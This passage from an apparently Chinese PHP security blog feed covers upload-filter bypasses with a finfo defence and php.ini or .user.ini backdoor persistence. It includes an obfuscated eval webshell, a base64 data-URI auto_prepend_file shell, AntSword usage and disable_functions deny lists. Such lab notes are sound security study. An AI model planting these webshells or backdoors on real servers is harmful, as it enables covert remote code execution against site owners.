class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//判断表单是否合法提交</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">print_r($_FILES);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [uploadFile] &#x3D;&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [name] &#x3D;&gt; 1.php</span><br><span class="line">            [type] &#x3D;&gt; text&#x2F;php</span><br><span class="line">            [tmp_name] &#x3D;&gt; &#x2F;Applications&#x2F;MAMP&#x2F;tmp&#x2F;php&#x2F;phpxc8lEX</span><br><span class="line">            [error] &#x3D;&gt; 0</span><br><span class="line">            [size] &#x3D;&gt; 30</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传文件的原名称</span><br><span class="line">上传文件的类型</span><br><span class="line">上传文件数据的临时存放位置</span><br><span class="line">上传过程中是否发生错误</span><br><span class="line">上传文件的大小</span><br></pre></td></tr></table></figure><h3 id="上传文件错误代码"><a href="#上传文件错误代码" class="headerlink" title="上传文件错误代码"></a>上传文件错误代码</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201113153713405.png" alt="image-20201113153713405"></p><h3 id="查看上传的临时文件位置"><a href="#查看上传的临时文件位置" class="headerlink" title="查看上传的临时文件位置"></a>查看上传的临时文件位置</h3><p>上传文件的默认临时目录，如果没有指定php.ini配置项upload_tmp_dir的值，则使用操作系统临时目录(c:\windows\temp)。通过phpinfo()函数查看。在mac上的临时文件为：</p><p><code>upload_tmp_dir /Applications/MAMP/tmp/php</code></p><p>为什么在 c:\windows\temp 中看不到上专文件呢？因为临时文件是短暂存在的，也就是在脚本执行完毕后，就消失了。</p><h3 id="将上传文件移动到新位置"><a href="#将上传文件移动到新位置" class="headerlink" title="将上传文件移动到新位置"></a>将上传文件移动到新位置</h3><p>描述：本函数检查并确保由 filename 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 destination 指定的文件。最好在临时文件没有消失前移动。</p><p>语法：<code>bool move_uploaded_file ( string $filename , string $destination )</code></p><p>参数：$filename，指定上传的临时文件名；$destination，指定新的文件名路径；</p><p>注意：如果文件已经存在，则会覆盖操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//判断表单是否合法提交</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$tmp_name=$_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">$dest_name=<span class="string">&quot;./upload/steady.php&quot;</span>;</span><br><span class="line">move_uploaded_file($tmp_name,$dest_name);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传不成功。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="上传文件的相关配置-php-ini"><a href="#上传文件的相关配置-php-ini" class="headerlink" title="上传文件的相关配置(php.ini)"></a>上传文件的相关配置(php.ini)</h3><p>upload_max_filesize配置：上传单个文件的大小限制，默认为2MB。</p><p>post_max_size配置：规定上传多个文件的总大小，默认为8MB。</p><p>max_file_uploads配置：规定最多上传的文件个数，默认为20个。</p><h3 id="获取文件路径信息-pathinfo"><a href="#获取文件路径信息-pathinfo" class="headerlink" title="获取文件路径信息 pathinfo()"></a>获取文件路径信息 pathinfo()</h3><p>描述：返回文件路径的信息 ;</p><p>语法：<code>mixed pathinfo ( string $path [, int $options = PATHINFO_DIRNAME | PATHINFO_BASENAME | PATHINFO_EXTENSION | PATHINFO_FILENAME ] )</code></p><p>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$path，要解析的路径。 </span><br><span class="line"></span><br><span class="line">$options，如果省略，返回全部单元；</span><br><span class="line"></span><br><span class="line">PATHINFO_DIRNAME，目录名称；</span><br><span class="line"></span><br><span class="line">PATHINFO_BASENAME，文件名称；</span><br><span class="line"></span><br><span class="line">PATHINFO_EXTENSION，扩展名；</span><br><span class="line"></span><br><span class="line">PATH_FILENAME，文件名。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ext=pathinfo(<span class="string">&quot;/steady/upload/steady.php&quot;</span>);</span><br><span class="line">print_r($ext);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [dirname] &#x3D;&gt; &#x2F;steady&#x2F;upload</span><br><span class="line">    [basename] &#x3D;&gt; steady.php</span><br><span class="line">    [extension] &#x3D;&gt; php</span><br><span class="line">    [filename] &#x3D;&gt; steady</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="检查数组中是否存在某个值-in-array"><a href="#检查数组中是否存在某个值-in-array" class="headerlink" title="检查数组中是否存在某个值 in_array()"></a>检查数组中是否存在某个值 in_array()</h3><p>描述：检查数组中是否存在某个值</p><p>语法：<code>bool in_array ( mixed $needle , array $arr )</code></p><p>参数：$needle检索的值，$arr原数组。</p><h3 id="生成唯一ID-uniqid"><a href="#生成唯一ID-uniqid" class="headerlink" title="生成唯一ID uniqid()"></a>生成唯一ID uniqid()</h3><p>描述：生成一个唯一ID</p><p>语法：<code>string uniqid ([ string $prefix = &quot;&quot; [, bool $more_entropy = false ]] )</code></p><p>参数：</p><p>$prefix前缀字符串，如果省略，返回字符串长度为13；</p><p>$more_entropy后缀字符串，如果为true，返回字符串长度为23。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_name=uniqid();</span><br><span class="line"><span class="keyword">echo</span> $file_name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">405fae4fd40b057</span><br></pre></td></tr></table></figure><h2 id="案例–文件上传并防御文件上传漏洞"><a href="#案例–文件上传并防御文件上传漏洞" class="headerlink" title="案例–文件上传并防御文件上传漏洞"></a>案例–文件上传并防御文件上传漏洞</h2><h3 id="修改后缀绕过"><a href="#修改后缀绕过" class="headerlink" title="修改后缀绕过"></a>修改后缀绕过</h3><p>将shell.jpg修改为shell.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$file_type=$_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前文件类型为:&quot;</span>.$file_type.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$file_extension=pathinfo($_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;当前文件拓展名为:&quot;</span>.$file_extension.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前文件类型为:image/jpeg</span><br><span class="line">当前文件拓展名为:jpg</span><br></pre></td></tr></table></figure><h3 id="修改文件类型绕过"><a href="#修改文件类型绕过" class="headerlink" title="修改文件类型绕过"></a>修改文件类型绕过</h3><p>上传shell.php，抓包修改类型为：image/jpeg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$file_type=$_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;当前文件类型为:&quot;</span>.$file_type.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常输出是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前文件类型为:text&#x2F;php</span><br></pre></td></tr></table></figure><p>抓包修改之后是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">POST /upload/upload2.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">82.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">82.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------33083442773106276502602784153</span></span><br><span class="line"><span class="comment">Content-Length: 654</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1:8888</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8888/upload/upload1.html</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------33083442773106276502602784153</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">class User</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  public $name = &#x27;&#x27;;</span></span><br><span class="line"><span class="comment">  public $config = null;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  function __destruct()&#123;</span></span><br><span class="line"><span class="comment">    <span class="doctag">@eval</span>(&#x27;&#x27;.$config.&quot;$this-&gt;name&quot;);</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">$user = new User;</span></span><br><span class="line"><span class="comment">$num = @$_POST[&#x27;num&#x27;];</span></span><br><span class="line"><span class="comment">$c = \base64_decode((substr(@$_POST[&#x27;a&#x27;],$num,-$num)));</span></span><br><span class="line"><span class="comment">$user-&gt;name = &#x27;&#x27;.$c;</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------33083442773106276502602784153</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;token&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">upload</span></span><br><span class="line"><span class="comment">-----------------------------33083442773106276502602784153--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image&#x2F;jpeg</span><br></pre></td></tr></table></figure><p>可以看到输出为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">13</span> Nov <span class="number">2020</span> <span class="number">09</span>:<span class="number">15</span>:<span class="number">06</span> GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.6</span><span class="number">.40</span></span><br><span class="line">Content-Length: <span class="number">36</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">文件类型为：image/jpeg&lt;br&gt;</span><br></pre></td></tr></table></figure><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p><code>finfo_file</code>和<code>finfo_open</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    $mime = finfo_file($finfo,$_FILES[<span class="string">&#x27;uploadFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $mime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>finfo_file</code>和<code>finfo_open</code>之后，我们即使抓包修改文件类型，也不能通过检测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CR-814f85c98460f9cccd0571d91395aa8d.jpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP安全-1</title>
      <link href="2019/12/06/PHP%E5%AE%89%E5%85%A8/"/>
      <url>2019/12/06/PHP%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h1><h2 id="PHP后门"><a href="#PHP后门" class="headerlink" title="PHP后门"></a>PHP后门</h2><h3 id="PHP配置可被修改的设定范围"><a href="#PHP配置可被修改的设定范围" class="headerlink" title="PHP配置可被修改的设定范围"></a>PHP配置可被修改的设定范围</h3><p>在PHP中有四种模式，他们定义了PHP的相关配置信息可以在那些范围内被修改。</p><table><thead><tr><th align="left">模式</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>PHP_INI_USER</code></td><td align="left">可在用户脚本（例如ini_set()或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定</td></tr><tr><td align="left"><code>PHP_INI_PERDIR</code></td><td align="left">可在 php.ini，.htaccess 或 httpd.conf 中设定</td></tr><tr><td align="left"><code>PHP_INI_SYSTEM</code></td><td align="left">可在 php.ini 或 httpd.conf 中设定</td></tr><tr><td align="left"><code>PHP_INI_ALL</code></td><td align="left">可在任何地方设定</td></tr></tbody></table><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><h4 id="auto-prepend-file与auto-append-file"><a href="#auto-prepend-file与auto-append-file" class="headerlink" title="auto_prepend_file与auto_append_file"></a>auto_prepend_file与auto_append_file</h4><p>在php.ini的数据处理配置选项中有两个配置项<code>auto_prepend_file与auto_append_file</code>。</p><ul><li><p>auto_prepend_file的作用是在php程序加载执行第一个php文件之前加载指定的php文件。</p></li><li><p>auto_append_file则是加载执行完成后加载指定的php文件。</p></li></ul><p>查询php手册可以看到该两项的修改范围为<code>PHP_INI_PERDIR</code>，能在php.ini、.htaccess、httpd.conf设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_fileNULLPHP_INI_PERDIR </span><br><span class="line">auto_append_fileNULLPHP_INI_PERDIR</span><br></pre></td></tr></table></figure><h4 id="include-path"><a href="#include-path" class="headerlink" title="include_path"></a>include_path</h4><p>include_path的作用就是设置用include()函数包函文件时的路径。可修改范围为<code>PHP_INI_ALL</code>。</p><p>比如：</p><p>在/usr/good/目录下有一个good.php文件，我们在php某一个文件中包含该文件，有两种方式：</p><ul><li><p>没有设置include_path，可以使用相对路径或者绝对路径来使用include函数进行包含。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;&#x2F;usr&#x2F;good&quot;)</span><br></pre></td></tr></table></figure></li><li><p>如果设置了include_path=”/usr/good/“，则可以在include函数中直接包含文件，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;goood.php&quot;)</span><br></pre></td></tr></table></figure></li></ul><p>设置php的include_path</p><ul><li><p>修改php.ini文件中的include_path项</p></li><li><p>使用ini_set方法，对于无法修改php.ini的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&quot;include_path&quot;, &quot;.:..&#x2F;:.&#x2F;include:..&#x2F;include)</span><br></pre></td></tr></table></figure></li></ul><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include_path &#x3D; &quot;.:&#x2F;Applications&#x2F;MAMP&#x2F;bin&#x2F;php&#x2F;php5.6.40&#x2F;lib&#x2F;php:&#x2F;tmp&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file &#x3D; &quot;steady.php&quot;</span><br><span class="line">auto_append_file &#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  &#x2F;tmp ls</span><br><span class="line">steady.php</span><br><span class="line">➜  &#x2F;tmp cat steady.php</span><br><span class="line">&lt;?php echo 123;?&gt;</span><br></pre></td></tr></table></figure><p>访问任意php文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;list.php</span><br></pre></td></tr></table></figure><p>输出123。</p><p>另外对于<code>auto_prepend_file</code>可以使用base64进行编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;&quot;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+&quot;</span><br></pre></td></tr></table></figure><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>这里要注意：</p><p>如果某项PHP配置，具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式，则可以在 <code>.user.ini</code> 文件中进行修改。</p><p><code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>两种方式的应用场景：</p><p>目标系统不允许上传PHP文件，我们可以上传<code>.ini</code>文件和一个包含webshell的其他后缀文件。</p></li><li><p>如果修改<code>php.ini</code>，需要重新启动服务器才能生效。</p><p>如果修改<code>.user.ini</code>，不需要重新启动服务器，可以设置默认时间即可重新加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_ini.cache_ttl &#x3D; 10  &#x2F;&#x2F;设置加载时间为10s 不需要重启apache时间一到自动加载。</span><br></pre></td></tr></table></figure></li><li><p><code>php.ini</code>大多用于隐藏PHP后门，而<code>.user.ini</code>大多用于文件上传。</p></li><li><p><code>.user.ini</code>只能在服务器使用CGI/FastCGI模式中使用。</p></li></ul><h2 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="绕过disable_function"></a>绕过<code>disable_function</code></h2><h3 id="disable-functions作用"><a href="#disable-functions作用" class="headerlink" title="disable_functions作用"></a>disable_functions作用</h3><h4 id="常规PHP文件"><a href="#常规PHP文件" class="headerlink" title="常规PHP文件"></a>常规PHP文件</h4><p>可以对特定的PHP函数进行禁用，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passthru exec system chroot chgrp chown shell_exec proc_open proc_get_status popen</span><br><span class="line">ini_alter ini_restore dl openlog syslog phpinfo</span><br></pre></td></tr></table></figure><p>本地构造php文件，<code>delete.php</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在php.ini中配置函数，此时我们配置为空：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; </span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;delete.php</span><br></pre></td></tr></table></figure><p>phpinfo正常回显。</p><p>如果修改配置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; phpinfo</span><br></pre></td></tr></table></figure><p>出现报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: phpinfo() has been disabled for security reasons in F:\webapp\Apache\htdocs\delete.php on line 2</span><br></pre></td></tr></table></figure><h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><p>没有函数限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; </span><br></pre></td></tr></table></figure><p>使用蚁剑连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apple:&#x2F;Applications&#x2F;MAMP&#x2F;htdocs) $ ls</span><br><span class="line">1.png</span><br><span class="line">DVWA</span><br><span class="line">MVC1</span><br><span class="line">conn.php</span><br><span class="line">delete.php</span><br><span class="line">libs</span><br><span class="line">list.php</span><br><span class="line">php</span><br><span class="line">phpinfo.php</span><br><span class="line">sqli</span><br><span class="line">upload</span><br><span class="line">upload-labs</span><br><span class="line">xss</span><br></pre></td></tr></table></figure><p>添加函数限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D; apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</span><br></pre></td></tr></table></figure><p>使用蚁剑执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(apple:&#x2F;Applications&#x2F;MAMP&#x2F;htdocs) $ ls</span><br><span class="line">ret&#x3D;127</span><br></pre></td></tr></table></figure><h3 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h3><h4 id="linux–蚁剑插件–LD-PRELOAD"><a href="#linux–蚁剑插件–LD-PRELOAD" class="headerlink" 